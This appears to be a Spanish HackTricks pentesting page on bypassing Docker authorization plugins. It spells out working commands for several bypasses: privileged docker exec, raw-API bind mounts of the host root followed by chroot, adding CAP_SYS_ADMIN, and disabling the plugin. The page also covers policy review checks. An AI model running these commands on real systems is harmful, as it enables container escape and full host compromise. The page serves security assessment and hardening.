# Plugins de autorización en tiempo de ejecución

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los plugins de autorización en tiempo de ejecución son una capa de políticas adicional que decide si un cliente puede realizar una acción determinada en el daemon. Docker es el ejemplo clásico. De forma predeterminada, cualquiera que pueda comunicarse con el daemon de Docker tiene, en la práctica, un amplio control sobre él. Los plugins de autorización intentan restringir ese modelo examinando al usuario autenticado y la operación de API solicitada, y luego permiten o deniegan la solicitud según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una API de Docker o a un usuario del grupo `docker`. En esos entornos, la pregunta ya no es solo «¿puedo llegar al daemon?», sino también «¿el daemon está protegido por una capa de autorización y, de ser así, se puede eludir esa capa mediante endpoints no gestionados, un análisis JSON débil o permisos de administración de plugins?».

## Funcionamiento

Cuando una solicitud llega al daemon de Docker, el subsistema de autorización puede pasar el contexto de la solicitud a uno o varios plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, los encabezados seleccionados y partes del cuerpo de la solicitud o de la respuesta cuando el tipo de contenido es compatible. Se pueden encadenar varios plugins, y el acceso solo se concede si todos permiten la solicitud.

Este modelo parece sólido, pero su seguridad depende por completo de lo bien que el autor de la política haya entendido la API. Un plugin que bloquea `docker run --privileged`, pero ignora `docker exec`, no detecta claves JSON alternativas como `Binds` de nivel superior o permite la administración de plugins, puede dar una falsa sensación de restricción y, aun así, dejar abiertos caminos directos para la escalada de privilegios.

## Objetivos comunes de los plugins

Entre las áreas importantes que se deben revisar en una política se incluyen:

- endpoints de creación de contenedores
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y las opciones para compartir espacios de nombres
- el comportamiento de `docker exec`
- endpoints de administración de plugins
- cualquier endpoint que pueda activar indirectamente acciones del runtime fuera del modelo de políticas previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaron el estudio de este modelo, ya que sus archivos de políticas y rutas de código mostraban cómo se implementaba realmente la correspondencia entre endpoints y acciones. Para las tareas de evaluación, la lección importante es que el autor de la política debe comprender toda la superficie de la API, no solo los comandos de CLI más visibles.

## Abuso

El primer objetivo es averiguar qué se bloquea realmente. Si el daemon deniega una acción, el error a menudo leaks el nombre del plugin, lo que ayuda a identificar el control en uso:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Si necesitas un perfilado más amplio de los endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea, repetitiva de otro modo, de comprobar qué rutas de la API y estructuras JSON permite realmente el plugin.

Si el entorno usa un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos se filtran realmente:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Estas comprobaciones son importantes porque muchos errores de autorización son específicos de los campos, no de los conceptos. Un plugin puede rechazar un patrón de CLI sin bloquear por completo la estructura equivalente de la API.

### Ejemplo completo: `docker exec` añade privilegios después de crear el contenedor

Una política que bloquea la creación de contenedores privilegiados, pero permite crear contenedores sin restricciones y usar `docker exec`, aún podría evadirse:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Si el daemon acepta el segundo paso, el usuario habrá recuperado un proceso interactivo con privilegios dentro de un contenedor que el autor de la política creía restringido.

Una regla de `sudo` restringida puede exponer la misma vía incluso cuando quien la invoca no puede acceder directamente al socket de Docker. Por ejemplo, una concesión para ejecutar `/usr/bin/docker exec *` con capacidad de root puede permitir que quien la invoca proporcione las opciones `--privileged` y `--user root` de Docker. Sigue siendo necesario que haya un contenedor en ejecución; en algunos hosts Linux, su ID es visible en la línea de comandos de un proceso `containerd-shim` cuando se deniega `docker ps`. Trata la regla como una pista para revisar: confirma la política efectiva de sudo, los controles de autorización del daemon, los user namespaces y si el proceso resultante puede acceder a un dispositivo del host o a un montaje del host con permisos de escritura. Docker documenta las opciones de `exec` en su [referencia de CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Un wrapper que se ejecuta como root y acepta un archivo de Compose elegido por quien lo invoca debe validar todo el [modelo de servicio de Compose](https://docs.docker.com/reference/compose-file/services/), no limitarse a rechazar `privileged: true` y exigir `:ro` en los bind mounts. Revisa `cap_add`, `security_opt`, los dispositivos, los namespaces, las entradas de build y todas las sintaxis de volúmenes admitidas. Un bind mount de solo lectura puede seguir permitiendo escrituras desde el interior de un contenedor con las capacidades adecuadas y una contención de seguridad relajada, según la política del daemon y del kernel. También hay que revisar las listas de permitidos de rutas del host basadas únicamente en prefijos y las comprobaciones de symlinks en el componente final de la ruta. Una regla de sudo y una llamada literal a `docker-compose up` identifican un caso candidato; la validación efectiva del wrapper y las restricciones de ejecución del daemon determinan si es explotable.

### Ejemplo completo: bind mount mediante la API sin procesar

Algunas políticas defectuosas inspeccionan solo una estructura JSON. Si el bind mount del sistema de archivos raíz no se bloquea de forma coherente, el host aún se puede montar:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

La misma idea también puede aparecer en `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

El impacto es un escape completo del sistema de archivos del host. El detalle interesante es que el bypass se debe a una cobertura incompleta de la política, no a un error del kernel.

### Ejemplo completo: atributo de capacidad sin comprobar

Si la política olvida filtrar un atributo relacionado con las capacidades, el atacante puede crear un contenedor que recupere una capacidad peligrosa:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Una vez que `CAP_SYS_ADMIN` o una capability de fuerza similar está disponible, se puede acceder a muchas técnicas de escape descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md).

### Ejemplo completo: desactivar el plugin

Si se permiten las operaciones de administración de plugins, la forma más sencilla de eludir el control podría ser desactivarlo por completo:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Esto es un fallo de política en el nivel del plano de control. La capa de autorización existe, pero el usuario al que debía restringir todavía conserva el permiso para desactivarla.

## Comprobaciones

Estos comandos sirven para identificar si existe una capa de políticas y si parece completa o superficial.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Qué resulta interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman que existe una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede bastar para descubrir si es posible deshabilitarlos o reconfigurarlos.
- Una política que bloquea solo las acciones obvias de la CLI, pero no las solicitudes directas a la API, debe considerarse vulnerable a bypass hasta que se demuestre lo contrario.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | No está habilitado de forma predeterminada | El acceso al daemon es, en la práctica, todo o nada, a menos que se configure un plugin de autorización | política incompleta del plugin, listas de bloqueo en lugar de listas de permitidos, permitir la gestión de plugins, puntos ciegos a nivel de campo |
| Podman | No tiene un equivalente directo común | Podman suele depender más de los permisos de Unix, la ejecución rootless y las decisiones sobre la exposición de la API que de los plugins de autorización de Docker | exponer ampliamente una API de Podman rootful, permisos débiles del socket |
| containerd / CRI-O | Modelo de control distinto | Estos runtimes suelen depender de los permisos del socket, los límites de confianza de los nodos y los controles del orquestador en capas superiores, en lugar de los plugins de autorización de Docker | montar el socket en las cargas de trabajo, suposiciones débiles sobre la confianza local del nodo |
| Kubernetes | Usa autenticación y autorización en las capas del API server y kubelet, no plugins de autorización de Docker | RBAC del clúster y controles de admisión son la principal capa de políticas | RBAC demasiado permisivo, políticas de admisión débiles, exponer directamente las API de kubelet o del runtime |

{{#include ../../../banners/hacktricks-training.md}}
